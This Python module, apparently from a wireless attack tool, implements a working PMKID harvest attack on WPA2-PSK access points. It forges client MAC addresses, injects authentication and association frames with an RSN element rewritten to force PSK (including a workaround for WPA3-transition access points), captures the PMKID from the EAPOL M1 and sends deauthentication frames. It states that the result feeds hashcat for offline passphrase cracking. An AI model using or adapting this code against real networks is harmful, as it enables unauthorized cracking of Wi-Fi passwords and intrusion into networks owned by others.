"""PMKID harvest attack (hcxdumptool-style, native).

Sequence per attempt:
    1. Inject Auth Req (Open System, seq=1) from a forged client MAC.
    2. Listen briefly for Auth Resp (status=0 means the AP will engage).
    3. Inject Assoc Req carrying a forced-PSK RSN IE (the AP's ciphers, AKM=PSK)
       + SSID + rates — a client selects one AKM, and PSK is what yields a
       harvestable PMKID; we bail first if the AP offers no PSK AKM.
    4. Wait for the AP's EAPOL M1 — many WPA2-PSK APs ship a PMKID KDE in
       the Key Data. The existing frame parser surfaces it as
       ``parsed['eapol_pmkid']`` and the WlanInterface populates
       ``AP.handshakes[source].pmkid`` for free.
    5. Deauth the AP and stop the moment M1 arrives. M1 is terminal: we can't
       send M2 (no PSK for its MIC), so a PMKID-less M1 means this AP exposes
       none — give up rather than retry the same empty M1 — and even on success
       the deauth frees the AP from retransmitting M1 for ~5 s. We only rotate
       the MAC and retry when the AP stays *silent* (a lost Auth/Assoc).

The attack returns the harvested 16-byte PMKID, or ``None`` if the AP answers
with a PMKID-less M1 (or never answers). Cracker-side, the existing
``engine/hc22000.write_hc22000`` writes a ``WPA*01*…`` hashline whenever
``hs.pmkid`` is set.
"""

from __future__ import annotations

import asyncio
import enum
import logging
import os
import struct
import time
from typing import Optional

from wifit3.engine.models import AccessPoint

from .campaign import Campaign

logger = logging.getLogger(__name__)


class PmkidFail(enum.Enum):
    """Why a PMKID harvest failed — the UI maps each to a short display line
    (engine stays markup-free; presentation/length live in the view)."""
    PMF_REQUIRED = "pmf_required"   # AP only associates protected (802.11w) clients
    NO_PSK_AKM = "no_psk_akm"       # AP offers no PSK AKM to harvest (e.g. SAE-only)
    NO_KDE = "no_kde"               # M1 arrived but carried no PMKID KDE
    NO_RESPONSE = "no_response"     # never got an M1 (AP stayed silent)
    PROTECTED = "protected"         # M1 arrived encrypted (PMF/transition) — parser can't read it


def _mac_bytes_to_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


# Standard supported rates IE (tag 1). Basic-rate bit (0x80) on the b/g
# mandatory rates. Encoded in 500 kbps units. The exact menu doesn't
# matter much — APs only check it's well-formed.
_SUPPORTED_RATES = bytes([
    0x82, 0x84, 0x8B, 0x96,         # 1, 2, 5.5, 11 (basic)
    0x0C, 0x12, 0x18, 0x24,         # 6, 9, 12, 18
])
_EXT_SUPPORTED_RATES = bytes([
    0x30, 0x48, 0x60, 0x6C,         # 24, 36, 48, 54
])

# Generic WPA2-PSK-CCMP RSN IE used when the AP's own IE is unavailable.
# Group=CCMP, Pairwise=CCMP, AKM=PSK, no caps.
_GENERIC_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")

# 00-0F-AC:2 (PSK). Our forged Assoc negotiates PSK, so any PMKID the AP returns
# is PSK-derived (crackable) — we assert it so the AKM crackability gate doesn't
# suppress a harvest on a WPA3-transition AP whose beacon also advertises SAE.
_AKM_PSK = 0x02

# AKMs whose PMK we can harvest *and* crack offline. PSK (00-0F-AC:2) is the only
# one with a hashcat mode (WPA*01) today; PSK-variants / others are crackable in
# principle but lack out-of-the-box tooling — add them here when that lands.
_HARVESTABLE_AKMS = (_AKM_PSK,)

# RSN Capabilities MFPC bit (bit 7) — "MFP Capable". Set (MFPR clear) when the
# target is PMF-capable so a WPA3→WPA2 transition AP — which advertises MFPC=1 and
# often only associates PMF-capable STAs — accepts our forged Assoc. (HW-observed:
# an XFSETUP transition gateway ACKed our Auth but silently dropped an MFPC=0 Assoc.)
_RSN_CAP_MFPC = 0x0080
# Group Management Cipher advertised with MFPC: BIP-CMAC-128 (00-0F-AC:6), the WPA3
# default; sent as a 4-byte suite after RSN caps + a zero PMKID count.
_BIP_CMAC_128 = b"\x00\x0f\xac\x06"


def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK, *, pmf_capable: bool = False) -> Optional[bytes]:
    """Rewrite an RSN IE to a single ``00-0F-AC:akm`` AKM (PSK by default) over the
    AP's version + group + pairwise ciphers, authoring a *correct client* RSN tail.
    Returns None if the IE is too short / malformed (caller falls back to generic).

    An Assoc Req should *select* one AKM; echoing the AP's full list claims SAE on a
    WPA3-transition AP and gets us ignored. Forcing PSK runs the PSK 4-way → PMKID
    in M1. The tail we author matches the AP's PMF posture (dropping its PMKID list):
      - ``pmf_capable`` → present as a PMF-*capable* PSK client: MFPC=1 (MFPR=0),
        PMKID-count 0, BIP group-mgmt cipher. A transition AP that only associates
        PMF-capable STAs then accepts us. (M1 is pre-PTK EAPOL, still unprotected.)
      - else → clean 0x0000 caps, no MFP tail.
    Neither echoes the AP's raw tail (MFPR/PMKID list) — that inconsistent profile
    was a suspected cause of the transition-AP 'M1 not found'. RSNE body layout:
    version(2) group(4) pw_count(2) pw(4*n) akm_count(2) akm(4*m) [caps(2)]
    [pmkid_count(2) pmkid...] [group-mgmt(4)]."""
    if len(rsn_ie) < 2 or rsn_ie[0] != 0x30:
        return None
    body = rsn_ie[2:2 + rsn_ie[1]]
    if len(body) < 8:
        return None
    pw_count = int.from_bytes(body[6:8], "little")
    akm_off = 8 + 4 * pw_count
    if akm_off + 2 > len(body):
        return None
    akm_count = int.from_bytes(body[akm_off:akm_off + 2], "little")
    akm_end = akm_off + 2 + 4 * akm_count
    if akm_end > len(body):
        return None
    new_akm = b"\x01\x00\x00\x0f\xac" + bytes([akm])      # count=1 + 00-0F-AC:akm
    if pmf_capable:                                       # MFPC=1, PMKID-count 0, BIP
        tail = _RSN_CAP_MFPC.to_bytes(2, "little") + b"\x00\x00" + _BIP_CMAC_128
    else:
        tail = b"\x00\x00"                               # clean caps, no MFP
    new_body = body[:akm_off] + new_akm + tail
    return bytes([0x30, len(new_body)]) + new_body


def _str_to_mac(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))


def _random_client_mac() -> bytes:
    """Locally-administered, unicast MAC (LAA bit set, multicast bit clear)."""
    rnd = os.urandom(5)
    return bytes([0x02]) + rnd


class PmkidHarvestAttack(Campaign):
    """Run a PMKID harvest against a single AP."""

    # --- Focus button eligibility ---------------------------------------------
    # The button asks the harvest's OWN question, so it can never offer a harvest
    # that run() would immediately bail on. (Lifecycle migration onto Campaign is
    # a later pass; these classmethods are forward-compatible with it.)
    button_id = "btn-pmkid"
    key = "pmkid"
    hotkey = ("p", "PMKID")
    stoppable = True                   # short one-shot, but the user can Stop between attempts
    idle_label = "PMKID"
    run_label = "Stop PMKID"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        """Shown when the AP advertises a harvestable (PSK) AKM, OR when its
        encryption isn't confirmed yet (no RSN IE parsed — e.g. a hidden AP heard
        only via a data frame): the latter shows the button *disabled with a reason*
        (ineligible_reason) rather than a silently-missing button. A CONFIRMED
        non-PSK AP (open / WEP / SAE-only / enterprise) still hides it, so the
        OPEN-network PMKID button bug can't recur."""
        akms = set(getattr(ap, "akm_suites", None) or ())
        if set(_HARVESTABLE_AKMS) & akms:
            return True                     # confirmed harvestable PSK
        if akms:
            return False                    # confirmed AKM(s), none harvestable
        return getattr(ap, "encryption", None) in (None, "Unknown")   # unconfirmed → disabled

    @classmethod
    def ineligible_reason(cls, ap) -> Optional[str]:
        """None (enabled) once a PSK AKM is confirmed; otherwise the 'why' shown on
        the disabled button. We only reach ``visible()`` without a PSK AKM when the
        encryption is unconfirmed, so a beacon (RSN IE) is what we're waiting on."""
        if set(_HARVESTABLE_AKMS) & set(getattr(ap, "akm_suites", None) or ()):
            return None
        return "encryption not confirmed yet (no beacon RSN)"

    def __init__(
        self,
        iface,
        target: AccessPoint,
        source_mac: Optional[bytes] = None,
        attempts: int = 3,
        m1_timeout: float = 2.0,
    ):
        super().__init__(ap=target, iface=iface)
        self.target = target
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.source_mac = source_mac or _random_client_mac()
        self.attempts = attempts
        self.m1_timeout = m1_timeout
        # Set by _loop on failure to the specific cause (PMF / PMKID-less M1 /
        # silent), so the UI reports why instead of guessing.
        self.fail_reason: Optional[PmkidFail] = None
        # Set by _loop to the harvested 16-byte PMKID on success — the screen
        # reads it (and fail_reason) once the campaign is `done`.
        self.pmkid: Optional[bytes] = None
        # True once any attempt armed active-monitor → teardown() clears it.
        self._armed = False
        # The Assoc RSN IE (single AKM=PSK), rebuilt from the AP's ciphers in _loop.
        self._assoc_rsn_ie: bytes = _GENERIC_RSN_IE
        # Register with the interface so client/handshake registration
        # ignores these MACs (they're not real clients).
        self.iface.register_forged_mac(self.source_mac)

    @property
    def client_mac(self) -> str:
        """The forged STA MAC we currently impersonate, as a colon string — the UI
        labels the harvest tree's ``Client:`` with it. Matches the handshake-dict
        key the parser populates, so it names the STA that received (or would have
        received) the M1."""
        return _mac_bytes_to_str(self.source_mac)

    def _rotate_mac(self) -> None:
        self.source_mac = _random_client_mac()
        self.iface.register_forged_mac(self.source_mac)

    # ---- Frame builders -----------------------------------------------------

    def _build_auth_req(self) -> bytes:
        """802.11 Authentication Request (Open System, seq=1)."""
        # FC: type=mgmt(0), subtype=auth(0x0B) → 0xB0
        mac_hdr = (
            b"\xb0\x00"                         # FC
            + b"\x00\x00"                       # Duration
            + self.bssid_bytes                  # Addr1 = BSSID (dest)
            + self.source_mac                   # Addr2 = us (source)
            + self.bssid_bytes                  # Addr3 = BSSID
            + b"\x00\x00"                       # Seq (hardware fills)
        )
        # Auth body: algo=0 (Open), seq=1, status=0
        body = b"\x00\x00" + b"\x01\x00" + b"\x00\x00"
        return mac_hdr + body

    def _build_assoc_req(self) -> bytes:
        """802.11 Association Request carrying SSID + rates + RSN IE."""
        # FC: type=mgmt(0), subtype=assoc_req(0x00) → 0x00
        mac_hdr = (
            b"\x00\x00"
            + b"\x00\x00"
            + self.bssid_bytes
            + self.source_mac
            + self.bssid_bytes
            + b"\x00\x00"
        )
        # Capability Info (2B LE) — ESS + Privacy.
        cap_info = struct.pack("<H", 0x0011)
        # Listen interval (2B LE).
        listen_int = struct.pack("<H", 0x0001)

        # Tag 0: SSID. We tolerate hidden / unknown SSIDs by sending zero-length
        # — the AP should still respond on its BSSID. Most APs require the
        # real SSID though, so prefer it if we have one.
        ssid = (self.target.ssid or "").encode("utf-8", errors="ignore")[:32]
        ssid_ie = bytes([0x00, len(ssid)]) + ssid

        # Tag 1: Supported Rates
        rates_ie = bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
        # Tag 50: Extended Supported Rates
        ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES

        # Tag 48: RSN IE — a single forced AKM=PSK over the AP's ciphers (built in
        # run()); generic PSK-CCMP if we had no usable AP IE.
        body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie + self._assoc_rsn_ie
        return mac_hdr + body

    def _build_deauth(self) -> bytes:
        """802.11 Deauthentication (reason 3 = STA leaving) from our forged MAC to
        the AP. Addr1=BSSID (dest), Addr2=us, Addr3=BSSID."""
        # FC: type=mgmt(0), subtype=deauth(0x0C) → 0xC0
        mac_hdr = (
            b"\xc0\x00"
            + b"\x00\x00"
            + self.bssid_bytes
            + self.source_mac
            + self.bssid_bytes
            + b"\x00\x00"
        )
        return mac_hdr + struct.pack("<H", 3)   # reason 3 = STA leaving

    # ---- Driver -------------------------------------------------------------

    def _received_m1(self):
        """The parser-created Handshake for our forged MAC on this AP once its M1
        (EAPOL-Key msg 1) lands — present the moment M1 arrives, with or without a
        PMKID; None until then. M1 is terminal for us: we can't compute M2's MIC
        without the PSK, so a PMKID-less M1 means this AP simply doesn't expose one
        (retrying the same AP would only re-fetch the same empty M1)."""
        ap_state = self.iface.access_points.get(self.target.bssid.lower())
        if not ap_state:
            return None
        return ap_state.handshakes.get(_mac_bytes_to_str(self.source_mac))

    async def _send_leaving_deauth(self, count: int = 3) -> None:
        """Deauth the AP (×count) the instant we have M1 — we never send M2, so
        otherwise the AP retransmits M1 for ~5 s waiting for it. Our deauth is
        un-ACKed (and on a card without active-monitor nothing is), so a single one
        could drop unnoticed — send a small burst so 'we're leaving' lands."""
        frame = self._build_deauth()
        for _ in range(count):
            await self.iface.send_raw(frame, use_no_ack=True)
            await asyncio.sleep(0.003)

    async def _loop(self) -> None:
        """Try up to ``self.attempts`` association rounds, stashing the 16-byte PMKID
        on ``self.pmkid`` (success) or the cause on ``self.fail_reason``.

        Receiving M1 is terminal: we deauth (we can never answer with M2) and stop
        — with the PMKID on success, or empty-handed if this AP ships a PMKID-less
        M1 (no point retrying the same AP). We only rotate the MAC and retry when
        the AP stays *silent* (a lost Auth/Assoc in the pre-M1 dance)."""
        self.fail_reason = None

        # PMF Required: the AP only associates protected (802.11w) clients, so our
        # unprotected Auth/Assoc is ignored — no M1, no PMKID. Don't waste the air.
        if self.target.pmf_required:
            self.fail_reason = PmkidFail.PMF_REQUIRED
            logger.info("[PMKID] %s is PMF-Required — unharvestable, skipping.",
                        self.target.bssid)
            return

        # Force a single AKM = PSK in our Assoc IE (a client selects one AKM;
        # echoing the AP's full list claims SAE on a WPA3-transition AP and gets us
        # ignored). Bail if the AP offers no harvestable (PSK) AKM at all.
        akm = next((a for a in _HARVESTABLE_AKMS
                    if a in (self.target.akm_suites or ())), None)
        if akm is None:
            self.fail_reason = PmkidFail.NO_PSK_AKM
            logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s) — can't harvest.",
                        self.target.bssid, self.target.akm_suites)
            return
        # Feed the generic through _force_psk_akm too (it's a valid RSN IE) so the PMF
        # posture applies even when we never captured the AP's own RSN IE.
        base_rsn = self.target.rsn_ie or _GENERIC_RSN_IE
        self._assoc_rsn_ie = (
            _force_psk_akm(base_rsn, akm, pmf_capable=self.target.pmf_capable) or _GENERIC_RSN_IE
        )
        # What we actually advertise on the wire — AKM + the authored RSN caps.
        # Key diagnostic for the transition-AP 'M1 not found': confirms the PMF
        # posture we present (MFPC mirrors the AP), so an Assoc the AP still drops or
        # an M1 that lands Protected is narrowed to the AP's own behaviour.
        logger.info("[PMKID] forged Assoc RSN IE (AKM→PSK 0x%02x, mfp_capable=%s): %s",
                    akm, self.target.pmf_capable, self._assoc_rsn_ie.hex())

        # Make sure we're on the AP's channel — Focus already tunes here,
        # but be defensive.
        if self.iface.current_channel != self.target.channel:
            await self.iface.set_channel(self.target.channel)

        # Active-monitor (HW-ACK our forged MAC) lets the AP treat us as a real STA
        # and reliably emit M1. set_fake_mac returns None when the card lacks the
        # FAKE_MAC capability — we just keep going un-ACKed (auth/sleep/assoc as
        # before). Re-armed per attempt (each rotates the source MAC); teardown()
        # clears it once.
        saw_protected = False   # a Protected (encrypted) M1 landed as unreadable "data"
        for attempt in range(1, self.attempts + 1):
            if self.stopped:
                return
            armed = await self.iface.set_fake_mac(self.source_mac, self.bssid_bytes)
            self._armed = self._armed or (armed is not None)
            logger.info(
                f"[PMKID] Attempt {attempt}/{self.attempts}: Auth + Assoc Req to "
                f"{self.target.bssid} as {_mac_bytes_to_str(self.source_mac)}"
                f"{' (HW-ACKed)' if armed else ''}"
            )
            await self.iface.send_raw(self._build_auth_req(), use_no_ack=True)
            # Tiny pause so the AP processes the Auth before the Assoc lands.
            await asyncio.sleep(0.1)
            if self.stopped:               # a Stop between Auth and Assoc lands here
                return
            await self.iface.send_raw(self._build_assoc_req(), use_no_ack=True)

            # Poll the parser-populated handshake dict for our forged MAC's M1.
            deadline = time.time() + self.m1_timeout
            while time.time() < deadline:
                if self.stopped:
                    return
                hs = self._received_m1()
                if hs is not None:
                    # M1 in hand — terminal. Free the air before we leave.
                    await self._send_leaving_deauth()
                    if hs.pmkid:
                        if hs.akm_client is None:
                            hs.akm_client = _AKM_PSK   # we negotiated PSK in our Assoc
                        logger.info(
                            f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
                            f"(STA {_mac_bytes_to_str(self.source_mac)})"
                        )
                        self.pmkid = hs.pmkid
                        return
                    self.fail_reason = PmkidFail.NO_KDE
                    logger.info(
                        f"[PMKID] {self.target.bssid} answered with a PMKID-less M1 — "
                        f"this AP doesn't expose one; not retrying."
                    )
                    return
                await asyncio.sleep(0.05)

            if self.iface.saw_protected_to_forged(
                    self.target.bssid, _mac_bytes_to_str(self.source_mac)):
                saw_protected = True
            logger.info(
                f"[PMKID] Attempt {attempt}: no readable M1 "
                f"({'M1 arrived PROTECTED' if saw_protected else 'AP silent'}) — "
                f"rotating MAC and retrying."
            )
            self._rotate_mac()

        # Exhausted every attempt. Distinguish a truly silent AP from one whose M1
        # arrived encrypted (PMF/transition) and was routed to unreadable "data".
        self.fail_reason = PmkidFail.PROTECTED if saw_protected else PmkidFail.NO_RESPONSE

    async def teardown(self) -> None:
        """Release the active-monitor MAC if any attempt armed it (was _loop's finally)."""
        if self._armed:
            await self.iface.clear_fake_mac()
